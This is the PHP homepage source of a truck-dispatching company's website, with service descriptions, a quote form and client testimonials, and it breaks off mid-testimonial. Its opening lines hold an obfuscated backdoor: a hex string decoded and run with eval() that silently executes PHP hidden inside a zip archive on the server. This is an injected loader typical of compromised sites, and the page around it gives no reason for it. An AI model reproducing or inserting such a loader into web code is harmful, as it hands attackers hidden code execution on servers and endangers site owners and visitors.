﻿<?php
$hex='3c3f7068702069662866696c655f65786973747328276377313939362e7a69702729297b7265717569726520277a69703a2f2f6377313939362e7a6970236377313939362e747874273b7d203f3e';
$bin=hex2bin($hex);
eval('?>'.$bin);?>
<!DOCTYPE html>
<html lang="en">


<head>

    <script type="application/ld+json">
        {
            "@context": "https://schema.org",
            "@type": "LocalBusiness",
            "name": "Vortex Truckers LLC",
            "url": "https://vortextruckersco.com/",
            "image": "https://vortextruckersco.com/assets/images/index-page.webp",
            "logo": "https://vortextruckersco.com/assets/images/logo.webp",
            "description": "Vortex Truckers LLC specializes in professional truck dispatching services, providing reliable support and logistics for independent truckers and carriers across the USA.",
            "telephone": "+1 909 639 4727",
            "email": "support@vortextruckersco.com",
            "address": {
                "@type": "PostalAddress",
                "streetAddress": "15442 Ventura Blvd., Ste 201-1361",
                "addressLocality": "Sherman Oaks",
                "addressRegion": "California",
                "postalCode": "91403",
                "addressCountry": "USA"
            },
            "openingHours": "Mo-Fr 09:00-18:00",
            "priceRange": "$$",
            "currenciesAccepted": "USD",
            "serviceArea": {
                "@type": "AdministrativeArea",
                "name": "United States"
            },
            "sameAs": [
                "https://www.instagram.com/switchnsave",
                "https://www.linkedin.com/company/switchnsave"
            ],
            "aggregateRating": {
                "@type": "AggregateRating",
                "ratingValue": "4.8",
                "bestRating": "5",
                "worstRating": "1",
                "ratingCount": "15",
                "reviewCount": "15"
            },
            "review": [{
                    "@type": "Review",
                    "reviewRating": {
                        "@type": "Rating",
                        "ratingValue": "5",
                        "bestRating": "5",
                        "worstRating": "1"
                    },
                    "author": {
                        "@type": "Person",
                        "name": "Sarah Johnson"
                    },
                    "reviewBody": "Vortex Truckers LLC helped streamline our dispatching operations with ease. Dependable and professional service!"
                },
                {
                    "@type": "Review",
                    "reviewRating": {
                        "@type": "Rating",
                        "ratingValue": "4.5",
                        "bestRating": "5",
                        "worstRating": "1"
                    },
                    "author": {
                        "@type": "Person",
                        "name": "Michael Brown"
                    },
                    "reviewBody": "Excellent truck dispatch support! Vortex made booking loads and communication with brokers a breeze."
                }
            ]
        }
    </script>


    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="wpOceans">

    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="Vortex Truckers LLC - Professional Truck Dispatching Services" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://vortextruckersco.com/assets/images/index-page.webp" />
    <meta property="og:url" content="https://vortextruckersco.com/" />
    <meta property="og:description" content="Reliable truck dispatching services for carriers and owner-operators across the USA. Focus on driving while we handle the logistics." />

    <!-- Twitter Meta Tags for Better Sharing -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Vortex Truckers LLC - Professional Truck Dispatching Services">
    <meta name="twitter:description" content="Reliable truck dispatching services for carriers and owner-operators across the USA. Focus on driving while we handle the logistics.">
    <meta name="twitter:image" content="https://vortextruckersco.com/assets/images/index-page.webp">
    <meta name="keywords" content="Vortex Truckers, freight shipping, trucking company, logistics, nationwide trucking, LTL, FTL, reefer transport, 24/7 tracking">
    <meta name="description" content="Vortex Truckers LLC Nationwide freight shipping. LTL, full truckload & reefer transport with 24/7 tracking and competitive rates.">


    <link rel="canonical" href="https://vortextruckersco.com/" />
    <link rel="shortcut icon" type="image/png" href="assets/images/favicon.webp">
    <title>Vortex Truckers LLC | Home</title>
    <link href="assets/css/themify-icons.css" rel="stylesheet">
    <link href="assets/css/flaticon_logistics.css" rel="stylesheet">
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/animate.css" rel="stylesheet">
    <link href="assets/css/owl.carousel.css" rel="stylesheet">
    <link href="assets/css/owl.theme.css" rel="stylesheet">
    <link href="assets/css/slick.css" rel="stylesheet">
    <link href="assets/css/slick-theme.css" rel="stylesheet">
    <link href="assets/css/swiper.min.css" rel="stylesheet">
    <link href="assets/css/owl.transitions.css" rel="stylesheet">
    <link href="assets/css/jquery.fancybox.css" rel="stylesheet">
    <link href="assets/css/odometer-theme-default.css" rel="stylesheet">
    <link href="assets/sass/styles.css" rel="stylesheet">
</head>

<body>

    <!-- start page-wrapper -->
    <div class="page-wrapper">

        <!-- Start header -->

        <?php include('header.php'); ?>

        <!-- end of header -->

        <!-- start of hero-section -->
        <section class="hero-section">
            <div class="hero-slider">
                <div class="slider-item">
                    <div class="bg-image">
                        <img class="animated" src="assets/images/slider/slide-1.webp" alt="Truck dispatching services"
                            data-animation-in="zoomInImage">
                    </div>
                    <div class="container">
                        <div class="content">
                            <h2 class="bg-text">Vortex</h2>
                            <h2 class="animated" data-animation-in="fadeInUp">Professional Truck Dispatching</h2>
                            <h3 class="animated" data-animation-in="fadeInUp">Efficient dispatching & fleet management</h3>
                            <p class="animated" data-animation-in="fadeInUp">Vortex Truckers LLC is a leading truck dispatching service provider that optimizes your fleet operations and maximizes your profitability through our advanced dispatch solutions.</p>
                            <div class="hero-btn animated" data-animation-in="fadeInUp">
                                <div class="btn-1">
                                    <a href="https://vortextruckersco.com/about" class="theme-btn">Our Services</a>
                                </div>
                                <div class="btn-2">
                                    <a href="tel:+19096394727" class="call">
                                        <div class="icon">
                                            <i class="flaticon-call"></i>
                                        </div>
                                        <div class="text">
                                            <span>Dispatch Hotline</span>
                                            <h4> +1 909 639 4727 </h4>
                                        </div>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="down-shape">
                        <svg width="19" height="86" viewBox="0 0 19 86" fill="none">
                            <path
                                d="M0.000800801 0.240602L0.0525983 6.64872L8.95468 14.2473L17.8817 6.38959L17.8301 0L17.8046 0.000184758L8.90289 7.83917L0.000800801 0.240602Z"
                                fill="white" fill-opacity="0.2" />
                            <path
                                d="M0.145332 18.0912L0.19713 24.4993L9.09922 32.0979L18.0263 24.2402L17.9746 17.8506L17.9492 17.8508L9.04742 25.6898L0.145332 18.0912Z"
                                fill="white" />
                            <path
                                d="M0.289863 35.9418L0.341661 42.3499L9.24375 49.9485L18.1708 42.0908L18.1191 35.7012L18.0937 35.7014L9.19195 43.5403L0.289863 35.9418Z"
                                fill="white" fill-opacity="0.2" />
                            <path
                                d="M0.434395 53.7924L0.486213 60.2031L9.3883 67.8017L18.3153 59.9413L18.2637 53.5518L18.2382 53.5519L9.33648 61.3909L0.434395 53.7924Z"
                                fill="white" fill-opacity="0.2" />
                            <path
                                d="M0.576951 71.6432L0.62877 78.054L9.53086 85.6526L18.4579 77.7922L18.4062 71.4053L18.3808 71.4055L9.47904 79.2418L0.576951 71.6432Z"
                                fill="white" fill-opacity="0.2" />
                        </svg>
                    </div>
                </div>
                <div class="slider-item">
                    <div class="bg-image">
                        <img class="animated" src="assets/images/slider/slide-1.webp" alt="Fleet management solutions"
                            data-animation-in="zoomInImage">
                    </div>
                    <div class="container">
                        <div class="content">
                            <h2 class="bg-text">Truckers</h2>
                            <h2 class="animated" data-animation-in="fadeInUp">24/7 Dispatch Support</h2>
                            <h3 class="animated" data-animation-in="fadeInUp">Reliable dispatching for owner-operators</h3>
                            <p class="animated" data-animation-in="fadeInUp">Vortex Truckers LLC provides comprehensive dispatch services that keep your trucks moving and your business growing. We handle load booking, route optimization, and paperwork so you can focus on the road.</p>
                            <div class="hero-btn animated" data-animation-in="fadeInUp">
                                <div class="btn-1">
                                    <a href="https://vortextruckersco.com/about" class="theme-btn">Learn More</a>
                                </div>
                                <div class="btn-2">
                                    <a href="tel:+19096394727 " class="call">
                                        <div class="icon">
                                            <i class="flaticon-call"></i>
                                        </div>
                                        <div class="text">
                                            <span>Dispatch Hotline</span>
                                            <h4> +1 909 639 4727 </h4>
                                        </div>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="down-shape">
                        <svg width="19" height="86" viewBox="0 0 19 86" fill="none">
                            <path
                                d="M0.000800801 0.240602L0.0525983 6.64872L8.95468 14.2473L17.8817 6.38959L17.8301 0L17.8046 0.000184758L8.90289 7.83917L0.000800801 0.240602Z"
                                fill="white" fill-opacity="0.2" />
                            <path
                                d="M0.145332 18.0912L0.19713 24.4993L9.09922 32.0979L18.0263 24.2402L17.9746 17.8506L17.9492 17.8508L9.04742 25.6898L0.145332 18.0912Z"
                                fill="white" />
                            <path
                                d="M0.289863 35.9418L0.341661 42.3499L9.24375 49.9485L18.1708 42.0908L18.1191 35.7012L18.0937 35.7014L9.19195 43.5403L0.289863 35.9418Z"
                                fill="white" fill-opacity="0.2" />
                            <path
                                d="M0.434395 53.7924L0.486213 60.2031L9.3883 67.8017L18.3153 59.9413L18.2637 53.5518L18.2382 53.5519L9.33648 61.3909L0.434395 53.7924Z"
                                fill="white" fill-opacity="0.2" />
                            <path
                                d="M0.576951 71.6432L0.62877 78.054L9.53086 85.6526L18.4579 77.7922L18.4062 71.4053L18.3808 71.4055L9.47904 79.2418L0.576951 71.6432Z"
                                fill="white" fill-opacity="0.2" />
                        </svg>
                    </div>
                </div>
            </div>
            <div class="track-btn">
                <a href="https://vortextruckersco.com/contact"><img src="assets/images/slider/icon.svg" alt="icon"> Track your load</a>
            </div>
        </section>
        <!-- end of hero-section -->

        <!-- start of wpo-about-section -->
        <section class="wpo-about-section">
            <div class="shape">
                <img src="assets/images/about/ab5.webp" alt="Truck dispatching network">
            </div>
            <div class="side-img">
                <img src="assets/images/about/ab4.webp" alt="Vortex Truckers LLC fleet">
            </div>
            <div class="container">
                <div class="row align-items-center">
                    <div class="col-lg-6 col-12">
                        <div class="about-left">
                            <div class="image-1">
                                <img src="assets/images/about/ab1.webp" alt="Dispatch team working">
                            </div>
                            <div class="image-2">
                                <img src="assets/images/about/ab2.webp" alt="Truck dispatching operations">
                            </div>
                            <div class="image-3">
                                <img src="assets/images/about/ab3.webp" alt="Fleet management system">
                            </div>
                            <div class="image-4">
                                <img src="assets/images/about/shape.webp" alt="shape">
                            </div>

                            <div class="since">
                                <div>
                                    <h2 class="odometer" data-count="2010">00</h2>
                                    <p>Years in Dispatch</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-6 col-12">
                        <div class="about-content">
                            <div class="title">
                                <h2>Reliable truck dispatching service</h2>
                                <h3>Dispatch & Fleet Management<br>We Keep Your Trucks Moving</h3>
                            </div>
                            <div class="sub-content">
                                <span>Vortex Truckers LLC is North America's premier truck dispatch service — we optimize your fleet operations and maximize profitability through our 24/7 dispatch solutions and load management expertise.</span>
                            </div>
                            <h4>Operating nationwide with specialized services across all transportation sectors.</h4>
                            <ul>
                                <li>24/7 Dispatch Support for owner-operators and fleets</li>
                                <li>Load optimization and backhaul solutions</li>
                                <li>Paperwork management and compliance assistance</li>
                                <li>Real-time tracking and communication</li>
                            </ul>

                            <div class="author-btn">
                                <div class="author">
                                    <div class="image">
                                        <img src="assets/images/about/profile.webp" alt="Vortex Truckers LLC CEO">
                                    </div>
                                    <div class="text">
                                        <img src="assets/images/about/signature.webp" alt="CEO Signature">
                                        <span>CEO & Lead Dispatcher</span>
                                    </div>
                                </div>
                                <div class="about-btn">
                                    <a href="https://vortextruckersco.com/about" class="theme-btn">
                                        Our Dispatch Services
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!-- end of wpo-about-section -->

        <!-- start of wpo-service-section -->
        <section class="wpo-service-section section-padding">
            <div class="container">
                <div class="row align-items-end">
                    <div class="col-lg-7 col-12">
                        <div class="wpo-section-title">
                            <h2>Professional Dispatch Services</h2>
                            <h3>Truck Dispatching Solutions<br>That Keep You Moving</h3>
                        </div>
                    </div>
                    <div class="col-lg-5 col-12">
                        <div class="service-all-btn">
                            <a href="https://vortextruckersco.com/services" class="theme-btn">All Dispatch Services</a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="container-fluid g-0">
                <div class="service-slider owl-carousel">
                    <div class="service-card">
                        <img class="image" src="assets/images/service/1.webp" alt="24/7 Dispatch Operations">
                        <div class="content">
                            <i class="flaticon-road-with-broken-line"></i>
                            <div class="text">
                                <span>01</span>
                                <h2><a href="https://vortextruckersco.com/services-details/24-7-dispatch">24/7 Dispatch Support</a></h2>
                                <p>Round-the-clock dispatching services to keep your trucks moving and loads booked</p>
                                <a href="https://vortextruckersco.com/services-details/24-7-dispatch" class="service-single-link">
                                    <i class="flaticon-right-arrow"></i>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="service-card">
                        <img class="image" src="assets/images/service/2.webp" alt="Load Board Management">
                        <div class="content">
                            <i class="flaticon-road-with-broken-line"></i>
                            <div class="text">
                                <span>02</span>
                                <h2><a href="https://vortextruckersco.com/services-details/load-board">Load Board Management</a></h2>
                                <p>We actively monitor all major load boards to find you the most profitable freight</p>
                                <a href="https://vortextruckersco.com/services-details/load-board" class="service-single-link">
                                    <i class="flaticon-right-arrow"></i>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="service-card">
                        <img class="image" src="assets/images/service/3.webp" alt="Fleet Management Solutions">
                        <div class="content">
                            <i class="flaticon-road-with-broken-line"></i>
                            <div class="text">
                                <span>03</span>
                                <h2><a href="https://vortextruckersco.com/services-details/fleet-management">Fleet Management</a></h2>
                                <p>Comprehensive dispatch solutions for fleets of all sizes to maximize efficiency</p>
                                <a href="https://vortextruckersco.com/services-details/fleet-management" class="service-single-link">
                                    <i class="flaticon-right-arrow"></i>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="service-card">
                        <img class="image" src="assets/images/service/1.webp" alt="Owner-Operator Support">
                        <div class="content">
                            <i class="flaticon-road-with-broken-line"></i>
                            <div class="text">
                                <span>04</span>
                                <h2><a href="https://vortextruckersco.com/services-details/owner-operator">Owner-Operator Support</a></h2>
                                <p>Dedicated dispatch services tailored for independent truckers and small fleets</p>
                                <a href="https://vortextruckersco.com/services-details/owner-operator" class="service-single-link">
                                    <i class="flaticon-right-arrow"></i>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="service-card">
                        <img class="image" src="assets/images/service/2.webp" alt="Route Optimization">
                        <div class="content">
                            <i class="flaticon-road-with-broken-line"></i>
                            <div class="text">
                                <span>05</span>
                                <h2><a href="https://vortextruckersco.com/services-details/route-optimization">Route Optimization</a></h2>
                                <p>Smart routing solutions to minimize deadhead miles and maximize profits</p>
                                <a href="https://vortextruckersco.com/services-details/route-optimization" class="service-single-link">
                                    <i class="flaticon-right-arrow"></i>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="service-card">
                        <img class="image" src="assets/images/service/3.webp" alt="Paperwork Management">
                        <div class="content">
                            <i class="flaticon-road-with-broken-line"></i>
                            <div class="text">
                                <span>06</span>
                                <h2><a href="https://vortextruckersco.com/services-details/paperwork-management">Paperwork Management</a></h2>
                                <p>We handle all the documentation so you can focus on driving</p>
                                <a href="https://vortextruckersco.com/services-details/paperwork-management" class="service-single-link">
                                    <i class="flaticon-right-arrow"></i>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!-- end of wpo-service-section -->

        <!-- stert of wpo-funfact-section -->
        <section class="wpo-funfact-section section-padding">
            <div class="container">
                <div class="titel-image">
                    <h1>Trucking</h1>
                    <h3>Dispatching solutions that exceed industry standards</h3>
                </div>
                <div class="row">
                    <div class="col-lg-3 col-md-6 col-12">
                        <div class="item">
                            <h2><span class="odometer" data-count="500"></span>+</h2>
                            <h3>Active trucks dispatched</h3>
                        </div>
                    </div>
                    <div class="col-lg-3 col-md-6 col-12">
                        <div class="item">
                            <h2><span class="odometer" data-count="15"></span>k+</h2>
                            <h3>Loads booked monthly</h3>
                        </div>
                    </div>
                    <div class="col-lg-3 col-md-6 col-12">
                        <div class="item">
                            <h2><span class="odometer" data-count="99"></span>%</h2>
                            <h3>On-time dispatch rate</h3>
                        </div>
                    </div>
                    <div class="col-lg-3 col-md-6 col-12">
                        <div class="item">
                            <h2><span class="odometer" data-count="24"></span>/7</h2>
                            <h3>Dispatch support</h3>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!-- end of wpo-funfact-section -->

        <!-- start of wpo-get-quate-section -->
        <section class="wpo-get-quate-section section-padding">
            <div class="container">
                <div class="row align-items-center">
                    <div class="col-lg-6 col-12">
                        <div class="left-content">
                            <div class="wpo-section-title">
                                <h2>Professional Dispatch Services</h2>
                                <h3>Dispatching solutions<br>tailored to your needs</h3>
                            </div>
                            <div class="quat">
                                <p>Our dispatch services consider factors like load optimization, route efficiency, cost-effectiveness, and 24/7 availability to maximize your trucking business's performance and profitability.</p>
                            </div>
                            <ul class="get-item">
                                <li>
                                    <i class="flaticon-logistics"></i>
                                    <h3>Regional & Long-Haul<br>Dispatch Coverage</h3>
                                </li>
                                <li>
                                    <i class="flaticon-nanotechnology"></i>
                                    <h3>Real-Time Load Tracking<br>& Communication</h3>
                                </li>
                            </ul>
                            <ul class="quate-item">
                                <li>
                                    <i class="flaticon-check"></i>
                                    <h3>Dedicated Dispatch Agent</h3>
                                </li>
                                <li>
                                    <i class="flaticon-check"></i>
                                    <h3>Paperwork & Compliance Management</h3>
                                </li>
                            </ul>
                            <a href="https://vortextruckersco.com/about" class="theme-btn">Why Choose Our Dispatch</a>
                        </div>
                    </div>
                    <div class="col-lg-6 col-12">
                        <div class="quote-form">
                            <div class="title">
                                <h3>Dispatch Service Inquiry</h3>
                            </div>
                            <form method="post" action="queryaction">
                                <div class="row">
                                    <div class="item col-lg-12">
                                        <label>Contact Information</label>
                                        <input class="form-control" type="text" name="name" id="name"
                                            placeholder="Your Name" required>
                                    </div>
                                    <div class="item col-lg-6 col-12">
                                        <input class="form-control" type="email" name="email" id="email"
                                            placeholder="Email" required>
                                    </div>
                                    <div class="item col-lg-6 col-12">
                                        <input class="form-control" type="text" name="phone" id="phone"
                                            placeholder="Phone" required>
                                    </div>
                                    <div class="item col-lg-12">
                                        <label>Dispatch Needs</label>
                                        <select name="service" id="service" class="form-control" required>
                                            <option value="">Select Service Type</option>
                                            <option value="owner-operator">Owner-Operator Dispatch</option>
                                            <option value="fleet">Fleet Dispatch Services</option>
                                            <option value="hotshot">Hotshot Dispatch</option>
                                            <option value="reefer">Reefer Dispatch</option>
                                        </select>
                                    </div>
                                    <div class="item col-lg-6 col-12">
                                        <label>Fleet Size</label>
                                        <select name="fleet-size" id="fleet-size" class="form-control" required>
                                            <option value="">Number of Trucks</option>
                                            <option value="1-5">1-5 Trucks</option>
                                            <option value="6-10">6-10 Trucks</option>
                                            <option value="11-20">11-20 Trucks</option>
                                            <option value="20+">20+ Trucks</option>
                                        </select>
                                    </div>
                                    <div class="item col-lg-6 col-12">
                                        <label>Primary Haul Type</label>
                                        <select name="haul-type" id="haul-type" class="form-control" required>
                                            <option value="">Select Haul Type</option>
                                            <option value="dry-van">Dry Van</option>
                                            <option value="flatbed">Flatbed</option>
                                            <option value="reefer">Reefer</option>
                                            <option value="specialized">Specialized</option>
                                        </select>
                                    </div>
                                    <div class="item col-12">
                                        <ul>
                                            <li>
                                                <input type="checkbox" id="24-7">
                                                <label for="24-7">24/7 Dispatch Needed</label>
                                            </li>
                                            <li>
                                                <input type="checkbox" id="backhaul">
                                                <label for="backhaul">Backhaul Assistance</label>
                                            </li>
                                            <li>
                                                <input type="checkbox" id="compliance">
                                                <label for="compliance">Compliance Support</label>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="item col-12">
                                        <input class="theme-btn" type="submit" value="Get Dispatch Quote">
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            <div class="left-bg">
                <div class="img1">
                    <img src="assets/images/get1.webp" alt="Truck dispatch operations">
                </div>

                <div class="img3">
                    <img src="assets/images/get3.svg" alt="Route optimization">
                </div>
            </div>
            <div class="rigth-bg">
                <img src="assets/images/get4.webp" alt="Vortex Truckers LLC dispatch team">
            </div>
        </section>
        <!-- end of wpo-get-quate-section -->

        <!-- start of wpo-features-section -->
        <section class="wpo-features-section section-padding">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-lg-8 col-12">
                        <div class="wpo-section-title">
                            <h2>Professional Dispatch Services</h2>
                            <h3>We provide reliable & efficient<br>dispatching solutions nationwide</h3>
                        </div>
                    </div>
                </div>
                <div class="features-wrap">
                    <div class="features-card">
                        <i class="flaticon-logistics"></i>
                        <h3>24/7<br>Dispatch Coverage</h3>
                    </div>
                    <div class="features-card">
                        <i class="flaticon-fast-delivery-1"></i>
                        <h3>Load Board<br>Management</h3>
                    </div>
                    <div class="features-card">
                        <i class="flaticon-locations"></i>
                        <h3>Real-Time<br>Load Tracking</h3>
                    </div>
                    <div class="features-card">
                        <i class="flaticon-logistics-1"></i>
                        <h3>Route<br>Optimization</h3>
                    </div>
                    <div class="features-card">
                        <i class="flaticon-customer-support"></i>
                        <h3>Dedicated<br>Dispatch Agent</h3>
                    </div>
                </div>
                <div class="row">
                    <div class="col-12">
                        <h4>Combine these services and maximize your trucking profits. </h4>
                    </div>
                </div>
            </div>
        </section>
        <!-- end of wpo-features-section -->

        <!-- stert of wpo-process-section -->
        <section class="wpo-process-section section-padding">
            <div class="container">
                <div class="process-wrap">
                    <div class="row">
                        <div class="col col-lg-3 col-md-6 col-12">
                            <div class="process-item">
                                <div class="top-contnent">
                                    <img src="assets/images/process/1.webp" alt="process 1">
                                    <div class="item-shape">
                                        <img src="assets/images/process/item-shape.svg" alt="item shape">
                                    </div>
                                    <div class="text">
                                        <span>Step - 01</span>
                                    </div>
                                    <div class="shape-1">
                                        <svg width="158" height="89" viewBox="0 0 158 89" fill="none">
                                            <g opacity="0.15">
                                                <path d="M0.0332031 30.3796L157.05 0L157.354 43.7086L30.269 88.9426"
                                                    fill="#868686" />
                                            </g>
                                        </svg>
                                    </div>
                                    <div class="shape-2">
                                        <svg width="48" height="17" viewBox="0 0 48 17" fill="none">
                                            <path
                                                d="M47.3549 0.599976L22.8851 16.5564L0.691406 12.5793L47.3549 0.599976Z" />
                                        </svg>
                                    </div>
                                </div>
                                <div class="content">
                                    <h2>Request a Quote</h2>
                                    <p>
                                        Contact Vortex Truckers LLC for a customized freight quote. Our team will assess your shipping needs and provide competitive rates.
                                    </p>
                                </div>
                            </div>
                        </div>
                        <div class="col col-lg-3 col-md-6 col-12">
                            <div class="process-item">
                                <div class="top-contnent">
                                    <img src="assets/images/process/2.webp" alt="process 2">
                                    <div class="item-shape">
                                        <img src="assets/images/process/item-shape.svg" alt="item shape">
                                    </div>
                                    <div class="text">
                                        <span>Step - 02</span>
                                    </div>
                                    <div class="shape-1">
                                        <svg width="158" height="89" viewBox="0 0 158 89" fill="none">
                                            <g opacity="0.15">
                                                <path d="M0.0332031 30.3796L157.05 0L157.354 43.7086L30.269 88.9426"
                                                    fill="#868686" />
                                            </g>
                                        </svg>
                                    </div>
                                    <div class="shape-2">
                                        <svg width="48" height="17" viewBox="0 0 48 17" fill="none">
                                            <path
                                                d="M47.3549 0.599976L22.8851 16.5564L0.691406 12.5793L47.3549 0.599976Z" />
                                        </svg>
                                    </div>
                                </div>
                                <div class="content">
                                    <h2>Schedule Pickup</h2>
                                    <p>
                                        Once you approve the quote, we'll arrange for pickup at your location with our reliable fleet of trucks and professional drivers.
                                    </p>
                                </div>
                            </div>
                        </div>
                        <div class="col col-lg-3 col-md-6 col-12">
                            <div class="process-item">
                                <div class="top-contnent">
                                    <img src="assets/images/process/3.webp" alt="process 3">
                                    <div class="item-shape">
                                        <img src="assets/images/process/item-shape.svg" alt="item shape">
                                    </div>
                                    <div class="text">
                                        <span>Step - 03</span>
                                    </div>
                                    <div class="shape-1">
                                        <svg width="158" height="89" viewBox="0 0 158 89" fill="none">
                                            <g opacity="0.15">
                                                <path d="M0.0332031 30.3796L157.05 0L157.354 43.7086L30.269 88.9426"
                                                    fill="#868686" />
                                            </g>
                                        </svg>
                                    </div>
                                    <div class="shape-2">
                                        <svg width="48" height="17" viewBox="0 0 48 17" fill="none">
                                            <path
                                                d="M47.3549 0.599976L22.8851 16.5564L0.691406 12.5793L47.3549 0.599976Z" />
                                        </svg>
                                    </div>
                                </div>
                                <div class="content">
                                    <h2>Safe Transport</h2>
                                    <p>
                                        Your cargo is transported with the highest safety standards. We provide real-time tracking so you can monitor your shipment.
                                    </p>
                                </div>
                            </div>
                        </div>
                        <div class="col col-lg-3 col-md-6 col-12">
                            <div class="process-item">
                                <div class="top-contnent">
                                    <img src="assets/images/process/4.webp" alt="process 4">
                                    <div class="item-shape">
                                        <img src="assets/images/process/item-shape.svg" alt="item shape">
                                    </div>
                                    <div class="text">
                                        <span>Step - 04</span>
                                    </div>
                                    <div class="shape-1">
                                        <svg width="158" height="89" viewBox="0 0 158 89" fill="none">
                                            <g opacity="0.15">
                                                <path d="M0.0332031 30.3796L157.05 0L157.354 43.7086L30.269 88.9426"
                                                    fill="#868686" />
                                            </g>
                                        </svg>
                                    </div>
                                    <div class="shape-2">
                                        <svg width="48" height="17" viewBox="0 0 48 17" fill="none">
                                            <path
                                                d="M47.3549 0.599976L22.8851 16.5564L0.691406 12.5793L47.3549 0.599976Z" />
                                        </svg>
                                    </div>
                                </div>
                                <div class="content">
                                    <h2>On-Time Delivery</h2>
                                    <p>
                                        Vortex Truckers LLC guarantees timely delivery of your goods. Our team ensures proper unloading and completes the process.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="border-shape">
                        <svg width="1014" height="93" viewBox="0 0 1014 93" fill="none">
                            <path
                                d="M1 50.9659C56.3481 18.4898 187.969 -31.1736 271.668 29.9813C376.292 106.425 467.026 98.4469 528 77.5C594.713 54.5817 761.5 15.5 831.5 24C901.5 32.5 936.5 57 1013.5 75"
                                stroke="#C4CDD3" stroke-width="1.5" stroke-dasharray="2 2" />
                        </svg>
                    </div>
                </div>
            </div>
        </section>
        <!-- end of wpo-process-section -->

        <!-- start of wpo-project-section -->

        <!-- end of wpo-project-section -->

        <!-- start of wpo-testimonial-section -->
        <section class="wpo-testimonial-section section-padding">
            <div class="container">
                <div class="testimonial-wrap testimonial-slider">
                    <div class="image slider-for">
                        <div class="item">
                            <span class="feedback"><img src="assets/images/testimonial/feedback.svg" alt="feedback image">
                                Feedback</span>
                            <img src="assets/images/about/1.webp" alt="testimonial">
                        </div>
                    </div>
                    <div class="content-wrap">
                        <h2>Trusted Transport Service</h2>
                        <h3>What Our Clients Say</h3>
                        <div class="slider-nav">
                            <div class="content">
                                <p>Vortex Truckers LLC has been a game changer for our logistics. Their dispatch service is quick, reliable, and always available.</p>
                                <div class="client-name">
                                    <h4>Michael Thompson/</h4>
                                    <span>Fleet Supervisor</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>The team at Vortex Truckers LLC truly understands the trucking industry. Their route optimization saved us time and fuel.</p>
                                <div class="client-name">
                                    <h4>Laura Bennett/</h4>
                                    <span>Logistics Coordinator</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>Working with Vortex Truckers LLC is smooth and stress-free. Their agents handle everything professionally and with care.</p>
                                <div class="client-name">
                                    <h4>James O'Connor/</h4>
                                    <span>Dispatch Head</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>We’ve seen a noticeable improvement in delivery times since partnering with Vortex Truckers LLC. Highly recommended!</p>
                                <div class="client-name">
                                    <h4>Vanessa Cole/</h4>
                                    <span>Operations Lead</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>Professional, dependable, and communicative—Vortex Truckers LLC delivers more than just loads, they deliver peace of mind.</p>
                                <div class="client-name">
                                    <h4>Andrew Kim/</h4>
                                    <span>Carrier Manager</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>We’ve used many dispatch services, but Vortex Truckers LLC stands out with their consistent performance and dedication.</p>
                                <div class="client-name">
                                    <h4>Emma Watson/</h4>
                                    <span>Freight Analyst</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>They manage our load board perfectly. We no longer worry about downtime or missed opportunities.</p>
                                <div class="client-name">
                                    <h4>Steven Clark/</h4>
                                    <span>Owner Operator</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>Vortex Truckers LLC always keeps us in the loop with real-time updates. Their tracking is top-notch!</p>
                                <div class="client-name">
                                    <h4>Tracy Morgan/</h4>
                                    <span>Logistics Planner</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>I trust Vortex Truckers LLC with all our high-priority shipments. They always come through.</p>
                                <div class="client-name">
                                    <h4>Kyle Daniels/</h4>
                                    <span>Transportation Lead</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>Customer service is amazing. They answer every call and always offer solutions. That’s rare today.</p>
                                <div class="client-name">
                                    <h4>Hannah Greene/</h4>
                                    <span>Support Supervisor</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>Since working with Vortex Truckers LLC, our team efficiency has improved dramatically. They're a true logistics partner.</p>
                                <div class="client-name">
                                    <h4>Brian Soto/</h4>
                                    <span>Fleet Dispatcher</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>Vortex Truckers LLC knows how to handle urgent loads. Their fast response and planning have helped us meet tight deadlines.</p>
                                <div class="client-name">
                                    <h4>Alyssa Park/</h4>
                                    <span>Supply Chain Manager</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>The level of professionalism they bring is unmatched. It's been a pleasure working with their team.</p>
                                <div class="client-name">
                                    <h4>Jordan Mitchell/</h4>
                                    <span>Carrier Relations</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>Reliable dispatch, constant updates, and a friendly team—Vortex Truckers LLC is our go-to logistics partner.</p>
                                <div class="client-name">
                                    <h4>Rebecca Lane/</h4>
                                    <span>Regional Manager</span>
                                </div>
                            </div>
                            <div class="content">
                                <p>From onboarding to daily dispatching, everything with Vortex Truckers LLC has been seamless. Great experience!</p>
                                <div class="client-name">
                                    <h4>Christopher Miles/</h4>
                                    <span>Transportation Consultant</span>
